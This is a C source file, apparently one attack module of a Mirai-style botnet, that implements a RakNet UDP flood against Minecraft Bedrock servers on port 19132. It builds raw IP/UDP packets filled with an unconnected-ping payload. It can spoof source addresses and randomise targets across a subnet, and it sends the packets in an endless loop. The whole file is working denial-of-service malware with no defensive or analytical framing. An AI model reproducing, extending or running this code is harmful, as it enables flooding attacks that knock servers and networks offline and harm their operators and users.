#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <time.h>
#include <string.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_raknet(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 19132);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 24);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    // RakNet unconnected ping payload
    unsigned char raknet_data[] = {
        0x02, // ID_UNCONNECTED_PING
        0x01, 0x02, 0x4D, 0xFF, 0xFF, 0x00, 0x00, 0xDD,
        0x00, 0xFF, 0xFF, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 
        0xFD, 0xFD, 0xFD, 0xFD, 0x12, 0x34, 0x56, 0x78, 
    };
    int pattern_len = sizeof(raknet_data);

    if (data_len < pattern_len)
        data_len = pattern_len;
    if (data_len > 1460)
        data_len = 1460;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting RakNet attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);

        // Fill packet with RakNet payload pattern
        int offset = 0;
        while (offset < data_len)
        {
            int copy_size = (data_len - offset) < pattern_len ? (data_len - offset) : pattern_len;
            util_memcpy(data + offset, raknet_data, copy_size);
            offset += pattern_len;
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            // Randomize target IP if netmask < 32
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();

            // Fill with RakNet pattern (repeat the pattern across the packet)
            int offset = 0;
            while (offset < data_len)
            {
                int copy_size = (data_len - offset) < pattern_len ? (data_len - offset) : pattern_len;
                util_memcpy(data + offset, raknet_data, copy_size);
                offset += pattern_len;
            }

            // Calculate checksums
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
}
